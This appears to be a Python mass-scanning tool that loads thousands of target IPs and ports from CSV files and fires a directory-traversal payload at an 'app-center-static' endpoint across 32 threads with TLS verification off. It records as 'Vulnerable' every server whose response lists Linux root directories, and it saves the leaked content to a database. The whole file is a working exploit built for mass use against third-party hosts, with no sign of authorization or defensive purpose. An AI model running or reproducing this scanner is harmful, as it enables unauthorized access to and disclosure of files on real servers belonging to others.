import pandas as pd
import requests
import os
import glob
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from database import add_target, add_target_batch, get_pending_targets, update_target_status

# 完全禁用 SSL 警告和验证
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 核心 Payload
PAYLOAD = "/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../"

# CSV 存放目录
CSV_DIR = "csv_imports"

# 多线程配置
MAX_WORKERS = 32  # 默认并发线程数


def process_csv(file_stream):
    """读取 CSV 并进行扫描（单文件上传）"""
    try:
        # 尝试多种编码和分隔符
        df = None
        for encoding in ['utf-8', 'gbk', 'gb2312', 'utf-8-sig']:
            for sep in [',', '\t']:
                try:
                    file_stream.seek(0)
                    df = pd.read_csv(file_stream, sep=sep, engine='python', encoding=encoding)
                    # 检查是否成功解析（列数大于1）
                    if len(df.columns) > 1:
                        break
                except:
                    continue
            if df is not None and len(df.columns) > 1:
                break
        
        if df is None or len(df.columns) <= 1:
            return []
        
        # 标准化列名
        df.columns = [c.strip().lower() for c in df.columns]

        results = []

        for _, row in df.iterrows():
            try:
                host_field = str(row.get('host', '')).strip()
                ip = str(row['ip']).strip()
                port = str(row['port']).strip()
                protocol = str(row.get('protocol', 'http')).strip().lower()
                country = str(row.get('country', '')).strip()
                region = str(row.get('region', '')).strip()
                city = str(row.get('city', '')).strip()

                # 清理协议
                if protocol not in ['http', 'https']:
                    protocol = 'http'
                
                # 从 host 字段提取实际的 host
                host = host_field
                if '://' in host:
                    host = host.split('://')[1]
                if ':' in host:
                    host = host.split(':')[0]
                
                if not host or host in ['nan', 'None']:
                    host = ip

                # 构造 Base URL
                base_url = f"{protocol}://{ip}:{port}"

                # 漏洞验证
                is_vuln, content = check_vulnerability(base_url)

                status = "Vulnerable" if is_vuln else "Safe"

                # 存入数据库
                add_target(base_url, host, ip, port, protocol, country, region, city, status, content if is_vuln else "")

                results.append((base_url, status))
            except Exception as e:
                print(f"Error processing row: {e}")
                continue

        return results
    except Exception as e:
        print(f"CSV Error: {e}")
        return []


def import_all_csv_files():
    """从指定目录导入所有 CSV 文件，去重后写入数据库"""
    # 确保目录存在
    if not os.path.exists(CSV_DIR):
        os.makedirs(CSV_DIR)
        return {"success": False, "message": f"目录 {CSV_DIR} 已创建，请放入 CSV 文件"}
    
    # 查找所有 CSV 文件
    csv_files = glob.glob(os.path.join(CSV_DIR, "*.csv"))
    
    if not csv_files:
        return {"success": False, "message": f"在 {CSV_DIR} 目录中未找到 CSV 文件"}
    
    # 收集所有目标
    all_targets = []
    seen = set()  # 用于去重
    total_rows = 0
    
    for csv_file in csv_files:
        try:
            # 尝试多种编码和分隔符
            df = None
            for encoding in ['utf-8', 'gbk', 'gb2312', 'utf-8-sig']:
                for sep in [',', '\t']:
                    try:
                        df = pd.read_csv(csv_file, sep=sep, engine='python', encoding=encoding)
                        # 检查是否成功解析（列数大于1）
                        if len(df.columns) > 1:
                            break
                    except:
                        continue
                if df is not None and len(df.columns) > 1:
                    break
            
            if df is None or len(df.columns) <= 1:
                print(f"无法解析文件: {csv_file}")
                continue
            
            # 标准化列名
            df.columns = [c.strip().lower() for c in df.columns]
            
            print(f"成功解析 {csv_file}，列: {df.columns.tolist()}")
            
            for _, row in df.iterrows():
                total_rows += 1
                try:
                    # 解析 host 字段（可能包含协议和端口）
                    host_field = str(row.get('host', '')).strip()
                    ip = str(row['ip']).strip()
                    port = str(row['port']).strip()
                    protocol = str(row.get('protocol', 'http')).strip().lower()
                    country = str(row.get('country', '')).strip()
                    region = str(row.get('region', '')).strip()
                    city = str(row.get('city', '')).strip()
                    
                    # 跳过无效数据
                    if ip in ['nan', 'None', ''] or port in ['nan', 'None', '']:
                        continue
                    
                    # 清理协议
                    if protocol not in ['http', 'https']:
                        protocol = 'http'
                    
                    # 从 host 字段提取实际的 host（去除协议和端口）
                    host = host_field
                    if '://' in host:
                        host = host.split('://')[1]
                    if ':' in host:
                        host = host.split(':')[0]
                    
                    # 如果 host 为空或无效，使用 IP
                    if not host or host in ['nan', 'None']:
                        host = ip
                    
                    # 构造 base_url
                    base_url = f"{protocol}://{ip}:{port}"
                    
                    # 去重
                    if base_url not in seen:
                        seen.add(base_url)
                        # (base_url, host, ip, port, protocol, country, region, city, status, root_content)
                        all_targets.append((base_url, host, ip, port, protocol, country, region, city, 'Pending', ''))
                except Exception as e:
                    print(f"Error parsing row in {csv_file}: {e}")
                    continue
        except Exception as e:
            print(f"Error reading {csv_file}: {e}")
            continue
    
    if not all_targets:
        return {"success": False, "message": "未能从 CSV 文件中解析出有效目标"}
    
    # 批量写入数据库
    inserted = add_target_batch(all_targets)
    
    return {
        "success": True,
        "message": f"成功导入 {len(csv_files)} 个文件，总行数 {total_rows}，去重后 {len(all_targets)} 条，新增 {inserted} 个目标",
        "total": len(all_targets),
        "inserted": inserted,
        "total_rows": total_rows
    }


def scan_single_target(target):
    """扫描单个目标（用于多线程）"""
    try:
        is_vuln, content = check_vulnerability(target['base_url'])
        
        if is_vuln:
            update_target_status(target['id'], 'Vulnerable', content)
            return 'vulnerable'
        else:
            update_target_status(target['id'], 'Safe', '')
            return 'safe'
            
    except Exception as e:
        print(f"Error scanning {target['base_url']}: {e}")
        update_target_status(target['id'], 'Error', str(e)[:200])
        return 'error'


def scan_pending_targets(max_workers=None):
    """使用多线程扫描所有待检查的目标"""
    if max_workers is None:
        max_workers = MAX_WORKERS
    
    pending = get_pending_targets()
    
    if not pending:
        return {"success": False, "message": "没有待检查的目标"}
    
    results = {"vulnerable": 0, "safe": 0, "error": 0}
    
    # 使用线程池并发扫描
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_target = {executor.submit(scan_single_target, target): target for target in pending}
        
        for future in as_completed(future_to_target):
            result = future.result()
            results[result] += 1
            
            # 打印进度
            total_done = sum(results.values())
            print(f"进度: {total_done}/{len(pending)} - 漏洞:{results['vulnerable']} 安全:{results['safe']} 错误:{results['error']}")
    
    return {
        "success": True,
        "message": f"扫描完成: {results['vulnerable']} 个漏洞, {results['safe']} 个安全, {results['error']} 个错误",
        "results": results
    }


def check_vulnerability(base_url):
    """
    发送 Payload 验证是否能看到目录结构
    完全禁用 SSL 验证
    """
    target = f"{base_url.rstrip('/')}{PAYLOAD}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
        # 创建自定义 session，完全禁用 SSL 验证
        session = requests.Session()
        session.verify = False
        
        # 设置重试策略，但减少重试次数
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # timeout 设置短一点，防止大量超时卡死
        resp = session.get(target, verify=False, timeout=5, headers=headers, allow_redirects=False)

        # 特征检测：Linux 根目录常见文件夹
        # 注意：有些系统可能会返回 json 或 XML，但大多数 LFI 会返回 HTML 列表
        signatures = ['etc/', 'bin/', 'usr/', 'var/', 'tmp/', 'root/']

        # 只要命中 2 个特征以上就认为是成功的
        hit_count = sum(1 for sig in signatures if sig in resp.text)

        if hit_count >= 2:
            return True, resp.text

    except Exception as e:
        # 只在调试时打印详细错误
        # print(f"Connection failed: {base_url} - {e}")
        pass

    return False, None